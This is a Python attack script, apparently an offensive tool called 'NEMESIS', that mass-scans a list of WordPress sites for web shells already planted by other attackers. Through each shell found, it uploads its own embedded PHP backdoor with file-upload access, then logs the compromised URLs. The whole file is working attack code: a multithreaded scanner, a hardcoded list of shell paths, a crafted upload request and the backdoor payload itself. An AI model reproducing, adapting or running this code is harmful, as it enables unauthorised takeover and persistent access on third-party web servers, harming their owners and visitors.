import sys , requests, re , string , random , hashlib
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)
#NEMESIS
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
#NEMESIS
aa= """
 __  __                                                  
/\ \/\ \                                    __           
\ \ `\\ \     __    ___ ___      __    ____/\_\    ____  
 \ \ , ` \  /'__`\/' __` __`\  /'__`\ /',__\/\ \  /',__\ 
  \ \ \`\ \/\  __//\ \/\ \/\ \/\  __//\__, `\ \ \/\__, `\
   \ \_\ \_\ \____\ \_\ \_\ \_\ \____\/\____/\ \_\/\____/
    \/_/\/_/\/____/\/_/\/_/\/_/\/____/\/___/  \/_/\/___/ 
                                                         
	CMS WORDPRESS AUTO UPLOAD SHELL & GET SHELL
"""
print(aa)
#NEMESIS
shell = """<?php error_reporting(0); echo php_uname()."<br>".getcwd()."<br>"; if($_GET['vs'] == 'victors'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>"""
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n Nemesis [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
#NEMESIS
def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site
def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))
def uploader(exploit_point):
    try:
        filename = ran(8)+'.php'
        requp = requests.session()
        dom = URLdomain(exploit_point)
        Part0ne = hashlib.md5(dom.encode()).hexdigest()
        PartTw0 = ''
        headersUp = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'Cookie': Part0ne+'='+PartTw0+';'}
        filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
        fileup = {'f[]': (filename, shell)}
        shell_path = exploit_point.replace(exploit_point.split('/')[-1],filename+'?vs=victors')
        try :
            up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=30)
        except:
            up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=45)
        try :
            check = requests.get(shell_path, headers=headers, timeout=15)
        except :
            check = requests.get(shell_path, headers=headers, timeout=30)
        if 'UPload' in check.content and 'multipart/form-data' in check.content:
            print ' -| ' + exploit_point + ' --> {}[Upload success]'.format(fg)
            open('Results/shells.txt', 'a').write(shell_path +'\n')
        else:
            if exploit_point.startswith("http://"):
                exploit_point = exploit_point.replace("http://","https://")
                uploader(exploit_point)
            else:
                print ' -| ' + exploit_point + ' --> {}[Upload Fail]'.format(fr)
    except:
        print ' -| ' + exploit_point + ' --> {}[Upload Fail]'.format(fr)
#NEMESIS
def Exploiter(url):
    try:
        paths = ['/wp-content/plugins/ccx/index.php', '/ccx/index.php', '/xt/index.php', '/xleet-shell.php', '/xleet.php', '/xleetshell.php', '/wp-admin/includes/xleet-shell.php', '/wp-content/plugins/content-management/content.php', '/xlt.php', '/wp-content/plugins/xt/index.php', '/wp-content/xleet.php', '/xleet.php', '/wp-admin/xleet-shell.php']
        for path in paths:
            try:
                exploit_point = 'http://'+ URLdomain(url) + path
                check = requests.get(exploit_point, verify=False,headers=headers,timeout=20).content
                if '<pre align=center><form method=post>Password<br><input type=password name=pass' in check:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('Results/xleet-shell.txt', 'a').write(exploit_point +'\n')
                    uploader(exploit_point)
                else:
                    exploit_point = 'https://'+ URLdomain(url)+ path
                    check = requests.get(exploit_point, verify=False,headers=headers,timeout=20).content
                    if '<pre align=center><form method=post>Password<br><input type=password name=pass' in check:
                        print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                        open('Results/xleet-shell.txt', 'a').write(exploit_point +'\n')
                        uploader(exploit_point)
                    else:
                        print ' -| ' + url + ' --> {}[Failed]'.format(fr)
            except:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(100)
mp.map(Exploiter, target)
mp.close()
mp.join()
#NEMESIS
print '\n [!] {}Saved in Results/shells.txt'.format(fc)
